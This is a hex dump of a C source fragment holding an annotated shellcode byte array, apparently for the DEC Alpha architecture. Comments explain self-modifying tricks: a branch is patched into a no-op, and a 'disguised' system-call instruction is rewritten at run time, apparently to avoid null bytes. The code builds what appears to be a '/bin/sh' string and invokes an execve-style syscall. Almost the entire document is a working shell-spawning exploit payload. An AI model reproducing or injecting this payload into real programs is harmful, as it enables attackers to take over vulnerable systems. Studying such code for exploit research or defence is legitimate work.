00000000  63 68 61 72 20 73 68 65  6c 6c 63 6f 64 65 5b 5d  |char shellcode[]|
00000010  3d 0d 0a 20 20 20 20 20  20 20 20 22 5c 78 33 30  |=..        "\x30|
00000020  5c 78 31 35 5c 78 64 39  5c 78 34 33 22 20 20 20  |\x15\xd9\x43"   |
00000030  20 20 20 2f 2a 20 73 75  62 71 20 24 33 30 2c 32  |   /* subq $30,2|
00000040  30 30 2c 24 31 36 20 20  20 20 20 20 20 20 20 20  |00,$16          |
00000050  20 20 20 2a 2f 0d 0a 20  20 20 20 20 20 20 20 2f  |   */..        /|
00000060  2a 20 24 31 36 20 3d 20  24 33 30 20 2d 20 32 30  |* $16 = $30 - 20|
00000070  30 0d 0a 20 20 20 20 20  20 20 20 2f 2a 20 24 31  |0..        /* $1|
00000080  36 20 6d 75 73 74 20 68  61 76 65 20 74 68 65 20  |6 must have the |
00000090  73 68 65 6c 6c 63 6f 64  65 20 61 64 64 72 65 73  |shellcode addres|
000000a0  73 2e 20 48 6f 77 65 76  65 72 2c 20 62 65 66 6f  |s. However, befo|
000000b0  72 65 20 2a 2f 0d 0a 20  20 20 20 20 20 20 20 2f  |re */..        /|
000000c0  2a 20 74 68 65 20 62 73  72 20 69 6e 73 74 72 75  |* the bsr instru|
000000d0  63 74 69 6f 6e 2c 20 24  31 36 20 63 61 6e 27 74  |ction, $16 can't|
000000e0  20 68 61 76 65 20 74 68  65 20 61 64 64 72 65 73  | have the addres|
000000f0  73 2e 20 20 20 20 20 2a  2f 0d 0a 20 20 20 20 20  |s.     */..     |
00000100  20 20 20 2f 2a 20 54 68  69 73 20 69 6e 73 74 72  |   /* This instr|
00000110  75 63 74 69 6f 6e 20 6a  75 73 74 20 73 74 6f 72  |uction just stor|
00000120  65 20 74 68 65 20 6d 65  61 6e 69 6e 67 6c 65 73  |e the meaningles|
00000130  73 20 61 64 64 72 65 73  73 2e 20 2a 2f 0d 0a 20  |s address. */.. |
00000140  20 20 20 20 20 20 20 2f  2a 20 54 68 65 20 61 6c  |       /* The al|
00000150  6c 20 69 6e 73 74 72 75  63 74 69 6f 6e 20 62 65  |l instruction be|
00000160  66 6f 72 65 20 62 73 72  20 61 72 65 20 6d 65 61  |fore bsr are mea|
00000170  6e 69 6e 67 6c 65 73 73  2e 20 20 20 20 20 20 2a  |ningless.      *|
00000180  2f 0d 0a 0d 0a 20 20 20  20 20 20 20 20 22 5c 78  |/....        "\x|
00000190  31 31 5c 78 37 34 5c 78  66 30 5c 78 34 37 22 20  |11\x74\xf0\x47" |
000001a0  20 20 20 20 20 2f 2a 20  62 69 73 20 24 33 31 2c  |     /* bis $31,|
000001b0  30 78 38 33 2c 24 31 37  20 20 20 20 20 20 20 20  |0x83,$17        |
000001c0  20 20 20 20 20 2a 2f 0d  0a 20 20 20 20 20 20 20  |     */..       |
000001d0  20 2f 2a 20 24 31 37 20  3d 20 30 20 6f 72 20 30  | /* $17 = 0 or 0|
000001e0  78 38 33 20 20 20 20 20  20 20 20 20 20 20 20 20  |x83             |
000001f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000200  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 20 20 20  |         */..   |
00000210  20 20 20 20 20 2f 2a 20  24 31 37 20 3d 20 30 78  |     /* $17 = 0x|
00000220  38 33 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |83              |
00000230  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000240  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 2f 0d  |             */.|
00000250  0a 20 20 20 20 20 20 20  20 22 5c 78 31 32 5c 78  |.        "\x12\x|
00000260  39 34 5c 78 30 37 5c 78  34 32 22 20 20 20 20 20  |94\x07\x42"     |
00000270  20 2f 2a 20 61 64 64 71  20 24 31 36 2c 36 30 2c  | /* addq $16,60,|
00000280  24 31 38 20 20 20 20 20  20 20 20 20 20 20 20 20  |$18             |
00000290  20 2a 2f 0d 0a 20 20 20  20 20 20 20 20 22 5c 78  | */..        "\x|
000002a0  66 63 5c 78 66 66 5c 78  33 32 5c 78 62 32 22 20  |fc\xff\x32\xb2" |
000002b0  20 20 20 20 20 2f 2a 20  73 74 6c 20 24 31 37 2c  |     /* stl $17,|
000002c0  2d 34 28 24 31 38 29 20  20 20 20 20 20 20 20 20  |-4($18)         |
000002d0  20 20 20 20 20 2a 2f 0d  0a 20 20 20 20 20 20 20  |     */..       |
000002e0  20 2f 2a 20 24 31 37 28  22 5c 78 38 33 5c 78 30  | /* $17("\x83\x0|
000002f0  30 5c 78 30 30 5c 78 30  30 22 29 20 69 73 20 73  |0\x00\x00") is s|
00000300  74 6f 72 65 64 20 69 6e  20 24 31 36 20 2b 20 36  |tored in $16 + 6|
00000310  30 20 2d 20 34 20 20 20  20 2a 2f 0d 0a 20 20 20  |0 - 4    */..   |
00000320  20 20 20 20 20 2f 2a 20  61 64 64 72 65 73 73 2e  |     /* address.|
00000330  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000350  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 2f 0d  |             */.|
00000360  0a 20 20 20 20 20 20 20  20 2f 2a 20 28 20 22 5c  |.        /* ( "\|
00000370  78 66 66 5c 78 66 66 5c  78 66 66 5c 78 66 66 22  |xff\xff\xff\xff"|
00000380  20 2d 3e 20 22 5c 78 38  33 5c 78 30 30 5c 78 30  | -> "\x83\x00\x0|
00000390  30 5c 78 30 30 22 20 29  20 20 20 20 20 20 20 20  |0\x00" )        |
000003a0  20 2a 2f 0d 0a 0d 0a 20  20 20 20 20 20 20 20 22  | */....        "|
000003b0  5c 78 66 66 5c 78 34 37  5c 78 33 66 5c 78 32 36  |\xff\x47\x3f\x26|
000003c0  22 20 20 20 20 20 20 2f  2a 20 6c 64 61 68 20 24  |"      /* ldah $|
000003d0  31 37 2c 30 78 34 37 66  66 28 24 33 31 29 20 20  |17,0x47ff($31)  |
000003e0  20 20 20 20 20 20 20 2a  2f 0d 0a 20 20 20 20 20  |       */..     |
000003f0  20 20 20 22 5c 78 31 66  5c 78 30 34 5c 78 33 31  |   "\x1f\x04\x31|
00000400  5c 78 32 32 22 20 20 20  20 20 20 2f 2a 20 6c 64  |\x22"      /* ld|
00000410  61 20 24 31 37 2c 30 78  30 34 31 66 28 24 31 37  |a $17,0x041f($17|
00000420  29 20 20 20 20 20 20 20  20 20 20 2a 2f 0d 0a 20  |)          */.. |
00000430  20 20 20 20 20 20 20 2f  2a 20 24 31 37 20 3d 20  |       /* $17 = |
00000440  22 5c 78 31 66 5c 78 30  34 5c 78 66 66 5c 78 34  |"\x1f\x04\xff\x4|
00000450  37 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |7"              |
00000460  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2a  |               *|
00000470  2f 0d 0a 20 20 20 20 20  20 20 20 2f 2a 20 22 5c  |/..        /* "\|
00000480  78 31 66 5c 78 30 34 5c  78 66 66 5c 78 34 37 22  |x1f\x04\xff\x47"|
00000490  20 69 73 20 6e 6f 70 20  69 6e 73 74 72 75 63 74  | is nop instruct|
000004a0  69 6f 6e 2e 20 20 20 20  20 20 20 20 20 20 20 20  |ion.            |
000004b0  20 20 20 2a 2f 0d 0a 0d  0a 20 20 20 20 20 20 20  |   */....       |
000004c0  20 22 5c 78 66 63 5c 78  66 66 5c 78 33 30 5c 78  | "\xfc\xff\x30\x|
000004d0  62 32 22 20 20 20 20 20  20 2f 2a 20 73 74 6c 20  |b2"      /* stl |
000004e0  24 31 37 2c 2d 34 28 24  31 36 29 20 20 20 20 20  |$17,-4($16)     |
000004f0  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 20 20 20  |         */..   |
00000500  20 20 20 20 20 2f 2a 20  63 68 61 6e 67 65 20 22  |     /* change "|
00000510  62 73 72 20 24 31 36 2c  2d 32 38 22 20 69 6e 73  |bsr $16,-28" ins|
00000520  74 72 75 63 74 69 6f 6e  22 20 69 6e 74 6f 20 6e  |truction" into n|
00000530  6f 70 20 20 20 20 20 20  20 20 20 20 20 2a 2f 0d  |op           */.|
00000540  0a 20 20 20 20 20 20 20  20 2f 2a 20 69 6e 73 74  |.        /* inst|
00000550  72 75 63 74 69 6f 6e 20  74 6f 20 70 61 73 73 20  |ruction to pass |
00000560  74 68 72 6f 75 67 68 20  74 68 65 20 62 73 72 20  |through the bsr |
00000570  69 6e 73 74 72 75 63 74  69 6f 6e 2e 20 20 20 20  |instruction.    |
00000580  20 2a 2f 0d 0a 20 20 20  20 20 20 20 20 2f 2a 20  | */..        /* |
00000590  28 20 22 5c 78 66 39 5c  78 66 66 5c 78 31 66 5c  |( "\xf9\xff\x1f\|
000005a0  78 64 32 22 20 2d 3e 20  22 5c 78 31 66 5c 78 30  |xd2" -> "\x1f\x0|
000005b0  34 5c 78 66 66 5c 78 34  37 22 20 29 20 20 20 20  |4\xff\x47" )    |
000005c0  20 20 20 20 20 2a 2f 0d  0a 0d 0a 20 20 20 20 20  |     */....     |
000005d0  20 20 20 22 5c 78 66 39  5c 78 66 66 5c 78 31 66  |   "\xf9\xff\x1f|
000005e0  5c 78 64 32 22 20 20 20  20 20 20 2f 2a 20 62 73  |\xd2"      /* bs|
000005f0  72 20 24 31 36 2c 2d 32  38 20 20 20 20 20 20 20  |r $16,-28       |
00000600  20 20 20 20 20 20 20 20  20 20 20 2a 2f 0d 0a 20  |           */.. |
00000610  20 20 20 20 20 20 20 2f  2a 20 4a 75 6d 70 20 74  |       /* Jump t|
00000620  6f 20 22 62 69 73 20 24  33 31 2c 30 78 38 33 2c  |o "bis $31,0x83,|
00000630  24 31 37 22 20 61 6e 64  20 73 74 6f 72 65 20 74  |$17" and store t|
00000640  68 65 20 63 75 72 72 65  6e 74 20 20 20 20 20 2a  |he current     *|
00000650  2f 0d 0a 20 20 20 20 20  20 20 20 2f 2a 20 61 64  |/..        /* ad|
00000660  64 72 65 73 73 20 69 6e  20 74 68 65 20 24 31 36  |dress in the $16|
00000670  2e 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00000680  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000690  20 20 20 2a 2f 0d 0a 20  20 20 20 20 20 20 20 2f  |   */..        /|
000006a0  2a 20 41 66 74 65 72 20  6a 75 6d 70 2c 20 74 68  |* After jump, th|
000006b0  69 73 20 69 6e 73 74 75  72 63 74 69 6f 6e 20 77  |is insturction w|
000006c0  69 6c 6c 20 62 65 20 63  68 61 6e 67 65 64 20 69  |ill be changed i|
000006d0  6e 74 6f 20 20 20 20 2a  2f 0d 0a 20 20 20 20 20  |nto    */..     |
000006e0  20 20 20 2f 2a 20 6e 6f  70 20 69 6e 73 74 72 75  |   /* nop instru|
000006f0  63 74 69 6f 6e 2e 20 20  20 20 20 20 20 20 20 20  |ction.          |
00000700  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000710  20 20 20 20 20 20 20 20  20 20 20 2a 2f 0d 0a 0d  |           */...|
00000720  0a 20 20 20 20 20 20 20  20 22 5c 78 33 30 5c 78  |.        "\x30\x|
00000730  31 35 5c 78 64 39 5c 78  34 33 22 20 20 20 20 20  |15\xd9\x43"     |
00000740  20 2f 2a 20 73 75 62 71  20 24 33 30 2c 32 30 30  | /* subq $30,200|
00000750  2c 24 31 36 20 20 20 20  20 20 20 20 20 20 20 20  |,$16            |
00000760  20 2a 2f 0d 0a 20 20 20  20 20 20 20 20 22 5c 78  | */..        "\x|
00000770  33 31 5c 78 31 35 5c 78  64 38 5c 78 34 33 22 20  |31\x15\xd8\x43" |
00000780  20 20 20 20 20 2f 2a 20  73 75 62 71 20 24 33 30  |     /* subq $30|
00000790  2c 31 39 32 2c 24 31 37  20 20 20 20 20 20 20 20  |,192,$17        |
000007a0  20 20 20 20 20 2a 2f 0d  0a 20 20 20 20 20 20 20  |     */..       |
000007b0  20 22 5c 78 31 32 5c 78  30 34 5c 78 66 66 5c 78  | "\x12\x04\xff\x|
000007c0  34 37 22 20 20 20 20 20  20 2f 2a 20 63 6c 72 20  |47"      /* clr |
000007d0  24 31 38 20 20 20 20 20  20 20 20 20 20 20 20 20  |$18             |
000007e0  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 20 20 20  |         */..   |
000007f0  20 20 20 20 20 22 5c 78  34 30 5c 78 66 66 5c 78  |     "\x40\xff\x|
00000800  31 65 5c 78 62 36 22 20  20 20 20 20 20 2f 2a 20  |1e\xb6"      /* |
00000810  73 74 71 20 24 31 36 2c  2d 31 39 32 28 24 33 30  |stq $16,-192($30|
00000820  29 20 20 20 20 20 20 20  20 20 20 20 20 2a 2f 0d  |)            */.|
00000830  0a 20 20 20 20 20 20 20  20 22 5c 78 34 38 5c 78  |.        "\x48\x|
00000840  66 66 5c 78 66 65 5c 78  62 37 22 20 20 20 20 20  |ff\xfe\xb7"     |
00000850  20 2f 2a 20 73 74 71 20  24 33 31 2c 2d 31 38 34  | /* stq $31,-184|
00000860  28 24 33 30 29 20 20 20  20 20 20 20 20 20 20 20  |($30)           |
00000870  20 2a 2f 0d 0a 20 20 20  20 20 20 20 20 22 5c 78  | */..        "\x|
00000880  39 38 5c 78 66 66 5c 78  37 66 5c 78 32 36 22 20  |98\xff\x7f\x26" |
00000890  20 20 20 20 20 2f 2a 20  6c 64 61 68 20 24 31 39  |     /* ldah $19|
000008a0  2c 30 78 66 66 39 38 28  24 33 31 29 20 20 20 20  |,0xff98($31)    |
000008b0  20 20 20 20 20 2a 2f 0d  0a 20 20 20 20 20 20 20  |     */..       |
000008c0  20 22 5c 78 64 30 5c 78  38 63 5c 78 37 33 5c 78  | "\xd0\x8c\x73\x|
000008d0  32 32 22 20 20 20 20 20  20 2f 2a 20 6c 64 61 20  |22"      /* lda |
000008e0  24 31 39 2c 30 78 38 63  64 30 28 24 31 39 29 20  |$19,0x8cd0($19) |
000008f0  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 20 20 20  |         */..   |
00000900  20 20 20 20 20 22 5c 78  31 32 5c 78 30 34 5c 78  |     "\x12\x04\x|
00000910  66 66 5c 78 34 37 22 20  20 20 20 20 20 2f 2a 20  |ff\x47"      /* |
00000920  63 6c 72 20 24 31 38 20  20 20 20 20 20 20 20 20  |clr $18         |
00000930  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 2f 0d  |             */.|
00000940  0a 20 20 20 20 20 20 20  20 22 5c 78 34 30 5c 78  |.        "\x40\x|
00000950  66 66 5c 78 31 65 5c 78  62 36 22 20 20 20 20 20  |ff\x1e\xb6"     |
00000960  20 2f 2a 20 73 74 71 20  24 31 36 2c 2d 31 39 32  | /* stq $16,-192|
00000970  28 24 33 30 29 20 20 20  20 20 20 20 20 20 20 20  |($30)           |
00000980  20 2a 2f 0d 0a 20 20 20  20 20 20 20 20 22 5c 78  | */..        "\x|
00000990  34 38 5c 78 66 66 5c 78  66 65 5c 78 62 37 22 20  |48\xff\xfe\xb7" |
000009a0  20 20 20 20 20 2f 2a 20  73 74 71 20 24 33 31 2c  |     /* stq $31,|
000009b0  2d 31 38 34 28 24 33 30  29 20 20 20 20 20 20 20  |-184($30)       |
000009c0  20 20 20 20 20 2a 2f 0d  0a 20 20 20 20 20 20 20  |     */..       |
000009d0  20 22 5c 78 39 38 5c 78  66 66 5c 78 37 66 5c 78  | "\x98\xff\x7f\x|
000009e0  32 36 22 20 20 20 20 20  20 2f 2a 20 6c 64 61 68  |26"      /* ldah|
000009f0  20 24 31 39 2c 30 78 66  66 39 38 28 24 33 31 29  | $19,0xff98($31)|
00000a00  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 20 20 20  |         */..   |
00000a10  20 20 20 20 20 22 5c 78  64 30 5c 78 38 63 5c 78  |     "\xd0\x8c\x|
00000a20  37 33 5c 78 32 32 22 20  20 20 20 20 20 2f 2a 20  |73\x22"      /* |
00000a30  6c 64 61 20 24 31 39 2c  30 78 38 63 64 30 28 24  |lda $19,0x8cd0($|
00000a40  31 39 29 20 20 20 20 20  20 20 20 20 20 2a 2f 0d  |19)          */.|
00000a50  0a 20 20 20 20 20 20 20  20 22 5c 78 31 33 5c 78  |.        "\x13\x|
00000a60  30 35 5c 78 66 33 5c 78  34 37 22 20 20 20 20 20  |05\xf3\x47"     |
00000a70  20 2f 2a 20 6f 72 6e 6f  74 20 24 33 31 2c 24 31  | /* ornot $31,$1|
00000a80  39 2c 24 31 39 20 20 20  20 20 20 20 20 20 20 20  |9,$19           |
00000a90  20 2a 2f 0d 0a 20 20 20  20 20 20 20 20 22 5c 78  | */..        "\x|
00000aa0  33 63 5c 78 66 66 5c 78  37 65 5c 78 62 32 22 20  |3c\xff\x7e\xb2" |
00000ab0  20 20 20 20 20 2f 2a 20  73 74 6c 20 24 31 39 2c  |     /* stl $19,|
00000ac0  2d 31 39 36 28 24 33 30  29 20 20 20 20 20 20 20  |-196($30)       |
00000ad0  20 20 20 20 20 2a 2f 0d  0a 20 20 20 20 20 20 20  |     */..       |
00000ae0  20 22 5c 78 36 39 5c 78  36 65 5c 78 37 66 5c 78  | "\x69\x6e\x7f\x|
00000af0  32 36 22 20 20 20 20 20  20 2f 2a 20 6c 64 61 68  |26"      /* ldah|
00000b00  20 24 31 39 2c 30 78 36  65 36 39 28 24 33 31 29  | $19,0x6e69($31)|
00000b10  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 20 20 20  |         */..   |
00000b20  20 20 20 20 20 22 5c 78  32 66 5c 78 36 32 5c 78  |     "\x2f\x62\x|
00000b30  37 33 5c 78 32 32 22 20  20 20 20 20 20 2f 2a 20  |73\x22"      /* |
00000b40  6c 64 61 20 24 31 39 2c  30 78 36 32 32 66 28 24  |lda $19,0x622f($|
00000b50  31 39 29 20 20 20 20 20  20 20 20 20 20 2a 2f 0d  |19)          */.|
00000b60  0a 20 20 20 20 20 20 20  20 22 5c 78 33 38 5c 78  |.        "\x38\x|
00000b70  66 66 5c 78 37 65 5c 78  62 32 22 20 20 20 20 20  |ff\x7e\xb2"     |
00000b80  20 2f 2a 20 73 74 6c 20  24 31 39 2c 2d 32 30 30  | /* stl $19,-200|
00000b90  28 24 33 30 29 20 20 20  20 20 20 20 20 20 20 20  |($30)           |
00000ba0  20 2a 2f 0d 0a 20 20 20  20 20 20 20 20 22 5c 78  | */..        "\x|
00000bb0  31 33 5c 78 39 34 5c 78  65 37 5c 78 34 33 22 20  |13\x94\xe7\x43" |
00000bc0  20 20 20 20 20 2f 2a 20  61 64 64 71 20 24 33 31  |     /* addq $31|
00000bd0  2c 36 30 2c 24 31 39 20  20 20 20 20 20 20 20 20  |,60,$19         |
00000be0  20 20 20 20 20 2a 2f 0d  0a 20 20 20 20 20 20 20  |     */..       |
00000bf0  20 22 5c 78 32 30 5c 78  33 35 5c 78 36 30 5c 78  | "\x20\x35\x60\x|
00000c00  34 32 22 20 20 20 20 20  20 2f 2a 20 73 75 62 71  |42"      /* subq|
00000c10  20 24 31 39 2c 31 2c 24  30 20 20 20 20 20 20 20  | $19,1,$0       |
00000c20  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 0d 0a 20  |         */.... |
00000c30  20 20 20 20 20 20 20 22  5c 78 66 66 5c 78 66 66  |       "\xff\xff|
00000c40  5c 78 66 66 5c 78 66 66  22 3b 20 20 20 20 20 2f  |\xff\xff";     /|
00000c50  2a 20 63 61 6c 6c 73 79  73 20 28 20 64 69 73 67  |* callsys ( disg|
00000c60  75 69 73 65 64 20 29 20  20 20 20 20 20 20 20 2a  |uised )        *|
00000c70  2f 0d 0a 20 20 20 20 20  20 20 20 2f 2a 20 54 68  |/..        /* Th|
00000c80  69 73 20 77 69 6c 6c 20  62 65 20 63 68 61 6e 67  |is will be chang|
00000c90  65 64 20 74 6f 20 22 5c  78 38 33 5c 78 30 30 5c  |ed to "\x83\x00\|
00000ca0  78 30 30 5c 78 30 30 22  20 20 20 20 20 20 20 20  |x00\x00"        |
00000cb0  20 20 20 2a 2f                                    |   */|
00000cb5
